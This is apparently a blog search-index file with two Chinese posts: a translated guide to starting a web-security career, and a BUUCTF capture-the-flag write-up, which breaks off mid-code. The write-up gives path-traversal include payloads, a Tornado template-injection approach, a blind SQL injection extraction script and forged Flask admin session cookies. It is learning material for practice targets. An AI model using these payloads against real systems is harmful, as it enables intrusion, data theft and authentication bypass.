<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>How do I learn Web security?</title>
      <link href="/2020/04/30/How-do-I-learn-Web-security/"/>
      <url>/2020/04/30/How-do-I-learn-Web-security/</url>
      
        <content type="html"><![CDATA[<h1 id="How-do-I-learn-Web-security"><a href="#How-do-I-learn-Web-security" class="headerlink" title="How do I learn Web security?"></a>How do I learn Web security?</h1><h2 id="十个步骤开始你的-Web-应用安全职业"><a href="#十个步骤开始你的-Web-应用安全职业" class="headerlink" title="十个步骤开始你的 Web 应用安全职业"></a>十个步骤开始你的 Web 应用安全职业</h2><p>翻译自 <a href="https://www.quora.com/How-do-I-learn-Web-security" target="_blank" rel="noopener">其中一个回答</a></p><h3 id="熟练使用-Linux"><a href="#熟练使用-Linux" class="headerlink" title="熟练使用 Linux"></a>熟练使用 Linux</h3><p>​        我对此不够强调。如果您刚开始使用Web应用程序安全，那么强烈建议您熟悉Linux。这可能意味着放弃Windows实例（如果需要），然后完全迁移到Linux。</p><p>​        这是因为通常在渗透测试期间，您会遇到基于Linux构建的环境。是的，那里有许多Windows服务器，但是Linux的普及是不容忽视的。我将2年的时间从Windows切换回Linux，这是我的全职环境，它在使用各种工具和脚本以及入侵Web应用程序时为我提供了帮助，我需要更多的利用才能获得更多控制目标。</p><p>​        您可以使用Kali Linux，但也可以考虑将 Ubuntu 作为全职操作系统启动，并学习Linux附带的各种细节，并熟悉诸如安装新软件包，配置工具之类的基本任务。 ，编写自动化脚本和 cron 任务等。</p><h3 id="找到一个导师、多问问题并且利用网上的资源"><a href="#找到一个导师、多问问题并且利用网上的资源" class="headerlink" title="找到一个导师、多问问题并且利用网上的资源"></a>找到一个导师、多问问题并且利用网上的资源</h3><p>​        我绝对可以理解当您进入安全领域时的热情和冲动 - 您想学习一切，然后有成百上千的博客文章提到特定的“安全研究人员”如何破坏给定的目标。</p><p>​        是的，您将需要学习所有这些，但是需要将其纳入计划中，而不是<strong>一次全部</strong>，尤其是在开始时。尝试从 Web 应用程序安全性的基础开始，重点是查找常见的安全问题，将这些知识应用于易受攻击的目标，然后转向以实际的Web应用程序为目标。还建议您找一位自己完成整个旅程的导师，并可以为您提供所需的指导。</p><p>​        话虽这么说，但请记住，由于导师的角色不同，他们将无法花费大量时间来指导您，而只能给您一点点建议的方法。你需要利用这些零散的东西来成为专业人士，并使用在线资源来进一步研究感兴趣的主题。</p><p>​        有许多 Youtube 频道，博客文章和文章以及在线教育资源可以帮助您。您还应该参与在线讨论和各种论坛，以使社区感到舒适并分享您从第一手经验中学到的知识。</p><p>​        切记-如果您在每个时间点都要求别人帮助，这会让您放慢脚步。自己掌握事物并在线上学习。</p><h3 id="OWASP-TOP-10-AND-PTES"><a href="#OWASP-TOP-10-AND-PTES" class="headerlink" title="OWASP TOP 10 AND PTES"></a><strong>OWASP TOP 10 AND PTES</strong></h3><p>​        作为对Web应用程序安全性感兴趣的学习者，您可能多次遇到过 <code>OWASP Top 10</code> 一词。 </p><p>​        根据我起步时的经验，强烈建议您同时阅读 OWASP Top 10 名和渗透测试执行标准(PTES)，以使您对Web应用程序的安全性和方式有更清晰，更深入的了解。 我还建议您加入OWASP 或任何类似且相关的安全社区的本地聚会组织，并参加聚会。 一旦您觉得自己有有趣的话题和经验可以分享，请聚会组织者为您提供下一个活动的演讲时间。 </p><p>​        您将获得大量的诚实反馈，批评和学习要点，这将使您成为更好的Web应用程序安全性研究人员。<br>​        <strong>记住-采取行动是成功的第一步，第二步和第三步</strong>。</p><h3 id="学习编程语言"><a href="#学习编程语言" class="headerlink" title="学习编程语言"></a>学习编程语言</h3><p>​        为了成为一名优秀的Web应用程序安全研究人员，您必须精通编程语言。 即使不编写成熟的应用程序（您可以了解更多），您也需要具有足够的知识和了解，以便至少弄清楚特定代码块的用途。</p><p>​        在渗透测试中，您可能会遇到以下情况：拥有应用程序的源代码（白盒渗透测试），或者想要绕过应用程序白名单或破坏正则表达式，所有这些都需要对编程语言有亲身实践的经验并且对它有深入的了解。 原因是在大多数情况下，您不会在线上找到要解决的问题的直接答案，因此需要想出自己的解决方案来破坏应用程序的安全性。</p><p>​        一旦您想编写自己的工具或脚本，编程经验也可以派上用场 。</p><h3 id="可以学习一些安全工具但是不要成为脚本小子"><a href="#可以学习一些安全工具但是不要成为脚本小子" class="headerlink" title="可以学习一些安全工具但是不要成为脚本小子"></a>可以学习一些安全工具但是不要成为脚本小子</h3><p>​        您可能还记得，我在第一点提到您可以使用 Ubuntu （不一定是Kali Linux）开始Web应用程序安全性之旅。 这样做的原因是，一旦您使用 Ubuntu ，就可以更好地了解各种工具的工作方式，以及如何在首次使用时无法解决问题的情况下自行修复错误。 </p><p>​        一旦您有足够的信心，便可以稍后改用 Kali Linux，但请切记，这与工具无关，而与工具的使用方式有关。 在过去几年中进行的大量笔试中，我从未完全依靠工具。 我使用一种方法:工具只是提供我正在从事的工作的帮助。</p><h3 id="漏洞目标"><a href="#漏洞目标" class="headerlink" title="漏洞目标"></a>漏洞目标</h3><p>​        作为刚开始使用Web应用程序安全性的人，请尝试在易受攻击的目标上尝试各种Web应用程序安全性和利用技术。 </p><p>​        如今，您可以利用许多易受攻击的Web应用程序来熟悉Web应用程序安全性概念。 DVWA 和 <a href="http://www.itsecgames.com/" target="_blank" rel="noopener">bWAPP</a> 很好地说明了我作为Web应用程序安全研究人员向您推荐的早期建议。 通过艰巨的练习，从一个脆弱的目标移到另一个目标。<br>​        <strong>阅读，练习和重复</strong>。</p><h3 id="每天一个-VM"><a href="#每天一个-VM" class="headerlink" title="每天一个 VM"></a>每天一个 VM</h3><p>​        为了在Web应用程序安全方面建立成功的职业生涯和专业知识，目标设定至关重要。</p><p>​        这就是我所做的-我准备了所有可能作为虚拟机使用的目标的列表。 有关可用目标的详细列表，请参考 <a href="https://www.vulnhub.com/" target="_blank" rel="noopener">Vulnhub</a> 或 <a href="https://www.pentesterlab.com/exercises/web_for_pentester/" target="_blank" rel="noopener">PentesterLab</a> 。 我为自己设定了一个目标，在最初的30天里每天都使用一个虚拟机，以使自己充分了解可以用来开发Web应用程序的各种技术。</p><p>​         如果您在任何时间遇到困难，也可以参考 WP 并从那里继续前进。 完成练习后，您还可以参考多个演练，以了解实现本目标所用的所有不同方式。 如果您做了30天，请相信我，您将自己意识到您对Web应用程序安全性所获得的信心和技能。</p><h3 id="漏洞银行"><a href="#漏洞银行" class="headerlink" title="漏洞银行"></a>漏洞银行</h3><p>​        是时候从虚拟机转移进入真实世界了。 在 <a href="https://hackerone.com/" target="_blank" rel="noopener">HackerOne</a>，<a href="https://bugcrowd.com/" target="_blank" rel="noopener">BugCrowd</a>上创建一个帐户，然后开始在网站上查找可能找到的任何错误。 我发现对自己有用的方法之一是去不太知名的网站，以增加发现错误的机会。 如果一个特定的网站刚加入漏洞银行你就去寻找它的漏洞，也可以帮忙，而不是执行已经存在了两年的漏洞赏金计划，这对您有所帮助。</p><h3 id="READ-READ-READ"><a href="#READ-READ-READ" class="headerlink" title="READ,READ,READ"></a>READ,READ,READ</h3><p>​        确保每天阅读新的内容。<br>​        从安全网站订阅各种新闻通讯，关注所有相关的博客，关注有关Web应用程序安全性的推特推特帐户，参考最近披露的错误，最重要的是，尝试理解寻找这些错误的思考过程。<br>​        这有一些可能有用的链接：</p><p><a href="http://blog.attify.com/" target="_blank" rel="noopener">Attify Blog</a></p><p><a href="https://github.com/ngalongc/bug-bounty-reference/blob/master/README.md">GitHub Resources </a><br><a href="https://github.com/djadmin/awesome-bug-bounty">GitHub Bounty</a><br><a href="https://www.facebook.com/notes/phwd/facebook-bug-bounties/707217202701640" target="_blank" rel="noopener">FB Bounty</a><br><a href="http://roy-castillo.blogspot.in/" target="_blank" rel="noopener">Roy Castillo Blog</a><br><a href="https://labs.detectify.com/" target="_blank" rel="noopener">Labs Detectify</a><br><a href="http://www.nirgoldshlager.com/" target="_blank" rel="noopener">Nirgoldshlager</a><br><a href="https://seanmelia.wordpress.com/" target="_blank" rel="noopener">Seanmelia Blog</a><br><a href="http://blog.geekboy.ninja/" target="_blank" rel="noopener">Geekboy Ninja Blog</a><br><a href="https://forum.bugcrowd.com/t/researcher-resources-bounty-bug-write-ups/1137" target="_blank" rel="noopener">Bugcrowd Tips</a><br><a href="http://www.breaksec.com/?page_id=6002" target="_blank" rel="noopener">Breaksec</a><br><a href="http://homakov.blogspot.in/" target="_blank" rel="noopener">Homakov Blog</a><br><a href="https://bitquark.co.uk/blog/" target="_blank" rel="noopener">Bitquark Blog</a><br><a href="https://nealpoole.com/blog/" target="_blank" rel="noopener">Nealpoole</a><br><a href="http://nahamsec.com/" target="_blank" rel="noopener">Nahamsec</a><br><a href="http://stephensclafani.com/" target="_blank" rel="noopener">Stephensclafani</a><br><a href="http://insertco.in/articles" target="_blank" rel="noopener">Insertco articles</a><br><a href="http://josipfranjkovic.blogspot.in/" target="_blank" rel="noopener">Josipfranjkovic Blog</a><br><a href="http://www.websecuritylog.com/2016/09/google-web-security-bug-reward.html" target="_blank" rel="noopener">Websecuritylog</a><br><a href="https://www.vulnerability-lab.com/get_content.php?id=1176" target="_blank" rel="noopener">Vulnerability-Lab</a><br><a href="https://www.secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">Secgeek</a><br><a href="https://h1.sintheticlabs.com/" target="_blank" rel="noopener">H1.sintheticlabs</a><br><a href="https://blog.it-securityguard.com/" target="_blank" rel="noopener">Securityguard</a><br><a href="http://h1.nobbd.de/" target="_blank" rel="noopener">H1.nobbd</a></p><h3 id="建立属于你自己的东西"><a href="#建立属于你自己的东西" class="headerlink" title="建立属于你自己的东西"></a>建立属于你自己的东西</h3><p>​        到现在为止，您将有足够的机会进行Web应用程序安全性评估和渗透测试。 接下来的部分是根据您的经验，构建一些您认为对您有用的东西。 仅关注您在未来10或20天内可以构建的内容，这可以帮助您进行错误发现或利用过程。 完成后，您可以将该工具作为开源发布，也可以在组织内部使用（由您自己决定）。 </p><p>​        关键是要利用您所学的知识和技能来构建一些东西。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        我列出了进入Web应用程序安全性的最初旅程中所有可能的学习。 现在就取决于您要掌握这10点并进行研究，并成为一名更好的安全研究人员。 </p><p>​        如果这篇文章对您有所帮助，请在（<a href="https://twitter.com/amolbhure" target="_blank" rel="noopener">@amolbhure</a>）上向我打招呼，或与您认为可以用来建立Web应用程序安全性职业的任何人分享。</p>]]></content>
      
      
      <categories>
          
          <category> read </category>
          
      </categories>
      
      
        <tags>
            
            <tag> source </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题(1)</title>
      <link href="/2020/04/29/BUUCTF-WP/"/>
      <url>/2020/04/29/BUUCTF-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-wp"><a href="#BUUCTF-wp" class="headerlink" title="BUUCTF  wp"></a>BUUCTF  wp</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>查看源码</p><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&apos;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&apos;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&apos;file&apos;])        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])    ) {        include $_REQUEST[&apos;file&apos;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>存在 <code>phpmyadmin 4.8.1</code> 远程文件包含漏洞 <code>cve-2018-12613</code></p><blockquote><p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p><p>mb_substr — 获取部分字符串</p></blockquote><p>因为考虑到 <code>file</code> 可能带参数的问题所以先进行了一次 <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ，如果这里接下来的判断通过则直接返回 <code>true</code> 。如果失败则对返回的结果进行一次 <code>urldecode</code> ，我们知道浏览器会自动将传输的数据进行一次解码，所以我们传入二次编码的 <code>?-&gt;%253F</code> 之后会经过两次解码得到 <code>?</code> ,从而使返回 <code>true</code> .在 <code>checkfile</code> 返回 <code>true</code> 之后我们就有了目录穿越包含文件。</p><p>我们有两种方法:</p><pre><code>?file=hint.php?../../../../../ffffllllaaaaggggfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>打开页面发现三个链接，内容如下</p><pre><code>/flag.txt                //flag in /fllllllllllllag/welcome.txt            //render/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>应该是模板注入，而且需要 cookie_secret .抓包并没有抓到 cookie </p><p>观察链接： <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> 我们直接访问/fllllllllllllag 报错 <code>/error?msg=Error</code> ，在error 这里尝试 SSTI： <code>error?msg=1</code> 可以执行静态表达式，但是不能做运算。</p><p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &lt;title&gt;</span><br><span class="line"><span class="number">2</span>     &#123;&#123; escape(handler.settings[<span class="string">"blog_title"</span>]) &#125;&#125;</span><br><span class="line">3 &lt;/title&gt;</span><br></pre></td></tr></table></figure><p>但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！后来重新翻了一下文档，发现又是一个别名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias <span class="keyword">for</span> self.application.settings.</span><br></pre></td></tr></table></figure><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p><p>所以当我们访问 <code>RequestHandler.application.settings</code> 失败时，我们访问 <code>handler.settings</code> 得到 <code>secret_key</code> ,之后使用脚本进行 md5加密之后访问即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashli</span><br><span class="line">​<span class="function"><span class="keyword">def</span> <span class="title">md5value</span><span class="params">(s)</span>:</span></span><br><span class="line">​    md5 = hashlib.md5()</span><br><span class="line">​    md5.update(s.encode())</span><br><span class="line">​    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">​<span class="function"><span class="keyword">def</span> <span class="title">mdfive2</span><span class="params">()</span>:</span></span><br><span class="line">​    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">​    cookie = <span class="string">r"M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r"</span></span><br><span class="line">​    <span class="comment">#print(md5value(filename))</span></span><br><span class="line">​    <span class="comment"># print(md5value('*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U'))</span></span><br><span class="line">​    <span class="comment"># print(''+md5value(filename))</span></span><br><span class="line">​    print(md5value(cookie + md5value(filename)))<span class="comment">#hints md5(cookie_secret+md5(filename))</span></span><br><span class="line">​mdfive2()</span><br></pre></td></tr></table></figure><h2 id="CISCN-hack-world"><a href="#CISCN-hack-world" class="headerlink" title="CISCN-hack_world"></a>CISCN-hack_world</h2><p>进入靶机，看到：</p><pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;Now, just give the id of passage</code></pre><p>输入0，1，2 分别有不同回显，输入部分关键字显示 <code>bool(false)</code> ,应该是布尔盲注。在bp里FUZZ，<code>or、and、/*、union、空格</code>等都被过滤了。</p><p>直接 <code>select flag from flag</code> 查询被过滤，绕过空格可以用括号 <code>select(flag)from(flag)</code> </p><p>用二分法猜解名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php'</span></span><br><span class="line">data = &#123;<span class="string">"id"</span>:<span class="string">""</span>&#125;</span><br><span class="line">flag = <span class="string">'flag&#123;'</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    begin = <span class="number">32</span></span><br><span class="line">    end = <span class="number">126</span></span><br><span class="line">    tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">        print(begin,tmp,end)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        data[<span class="string">"id"</span>] = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(i,tmp)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = tmp+<span class="number">1</span></span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    flag+=chr(tmp)</span><br><span class="line">    print(flag)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">-1</span>]==<span class="string">'&#125;'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="HCTF admin"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask-session 伪造"></a>flask-session 伪造</h3><p>从源码得到提示下载到了源码</p><p>贴一部分代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.html</span><br><span class="line"></span><br><span class="line">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span><span class="params">(object)</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">routes.py/change</span><br><span class="line">​</span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure><p>可以看到用 admin 账户登陆即可得到 flag，这里涉及到了 flask session 伪造，简单搜索我们可以很容易搜到p神的 session<br>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p>先注册一个普通账号进行登陆，得到cookie，经过脚本解密 <code>python3 py3-flask_session_decode.py cookie</code> 得到：</p><pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;:b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>通过源码我们看到这句话 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，其中 <code>environ</code> 是一个字符串所对应环境的映像对象，例如 </p><pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]&apos;C:\\Users\\*****\\AppData\\Local\\Temp&apos;</code></pre><p>当获取不到 <code>SECRET_KEY</code> 时就使用 <code>ckj123</code> 作为密钥，这里我们不确定是不是能获取到环境变量里的key，但是我们用 ckj123 先进行测试。</p><p>利用搜到的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a> 修改 <code>name</code> 为 <code>admin</code> 来生成伪造的cookie：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py encode -s <span class="string">"ckj123"</span> -t <span class="string">"&#123;'_fresh': True, '_id': b'bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3', 'csrf_token': b'b7b7b2574958167d3670aa0e5bf46e47b60d1e39', 'image': b'TmDp', 'name': 'admin', 'user_id': '10'&#125;"</span></span><br></pre></td></tr></table></figure><p>生成新 cookie：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_<span class="number">-1</span>Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow<span class="number">.1</span>V55Ih_Ip48Y5fgVUgbSNrQlWyU</span><br></pre></td></tr></table></figure><p>此时我们替换已经登陆账号的 cookie 即可得到flag</p><h3 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h3><p>看WP看到的另一种方法，挺有意思</p><p>观察路由处的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 